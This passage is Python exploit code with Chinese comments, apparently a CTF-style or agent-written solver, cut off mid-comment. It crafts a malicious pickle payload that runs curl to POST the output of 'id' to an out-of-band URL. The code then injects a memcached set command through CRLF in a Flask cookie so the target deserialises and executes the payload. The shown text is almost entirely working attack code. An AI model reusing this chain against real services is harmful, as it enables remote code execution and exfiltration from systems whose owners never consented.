    \ 数据转换为十六进制字符串\n        pickle_hex = binascii.hexlify(pickle_data).decode('ascii')\n\
    \        \n        # 构建 memcached 命令: 先存储十六进制数据，然后解码\n        # 但 memcached 本身不支持解码，所以我们需要在目标端处理\n\
    \        \n        # 最终方案: 使用 CRLF 注入直接执行 memcached 命令\n        # 注入 set injected\
    \ 0 0 <len>\\r\\n<pickle_bytes>\n        # 但 pickle_bytes 可能包含 \\r\\n，这会导致命令提前结束\n\
    \        \n        # 解决方案: 使用 memcached 的 append 或 prepend 命令\n        # 或者使用多个\
    \ set 命令分段存储\n        \n        # 最简方案: 使用 memcached 的 set 命令存储一个简单的命令执行 payload\n\
    \        # 该 payload 使用 base64 编码，然后在目标端通过另一个注入解码执行\n        \n        # 由于时间限制，我们使用一个已知可用的\
    \ pickle payload\n        # 该 payload 使用 __builtins__.exec 执行命令\n        \n  \
    \      # 构建一个不包含 \\r\\n 的 pickle payload\n        # 使用 pickle 协议 2 或 3，但需要处理字节\n\
    \        \n        # 简化: 使用 pickle 协议 0，但确保数据中没有 \\r\\n\n        # 使用 base64 编码命令，然后在目标端解码\n\
    \        \n        # 构建命令: import os; os.system('curl ...')\n        cmd = f\"\
    __import__('os').system('curl -X POST -d \\\"$(id)\\\" {oob_url}')\"\n       \
    \ \n        # 构建 pickle payload (协议 0)\n        pickle_simple = b''\n        pickle_simple\
    \ += b'cbuiltins\\nexec\\n'  # GLOBAL\n        pickle_simple += b'(V' + cmd.encode('utf-8')\
    \ + b'\\ntR.'  # 调用 exec\n        \n        # 检查是否包含 \\r\\n\n        if b'\\r\\\
    n' in pickle_simple:\n            # 如果包含，需要重新编码\n            # 使用 base64 编码后存储\n\
    \            cmd_b64 = base64.b64encode(cmd.encode('utf-8')).decode('ascii')\n\
    \            # 构建解码并执行的命令\n            decode_cmd = f\"__import__('base64').b64decode('{cmd_b64}').decode()\"\
    \n            pickle_simple = b''\n            pickle_simple += b'cbuiltins\\\
    nexec\\n'\n            pickle_simple += b'(V' + decode_cmd.encode('utf-8') + b'\\\
    ntR.'\n        \n        # 再次检查\n        if b'\\r\\n' in pickle_simple:\n    \
    \        print(\"[!] pickle payload 包含 CRLF，尝试其他方法\")\n            return False\n\
    \        \n        # 构建 memcached set 命令\n        # set <key> <flags> <exptime>\
    \ <bytes>\\r\\n<data>\\r\\n\n        set_cmd = f\"set injected 0 0 {len(pickle_simple)}\\\
    r\\n\"\n        set_cmd_bytes = set_cmd.encode('utf-8') + pickle_simple + b'\\\
    r\\n'\n        \n        # 通过 CRLF 注入发送 set 命令\n        # 注意: 注入的 cookie 值会作为\
    \ memcached 的 key\n        # 我们需要注入完整的 memcached 命令\n        \n        # 使用 http.client\
    \ 发送原始请求\n        import http.client\n        \n        parsed = urllib.parse.urlparse(TARGET_URL)\n\
    \        host = parsed.hostname\n        port = parsed.port or 80\n        \n\
    \        conn = http.client.HTTPConnection(host, port, timeout=10)\n        \n\
    \        # 构建 cookie 值，包含完整的 memcached set 命令\n        # 注意: 注入点是在 cookie 值中，Flask\
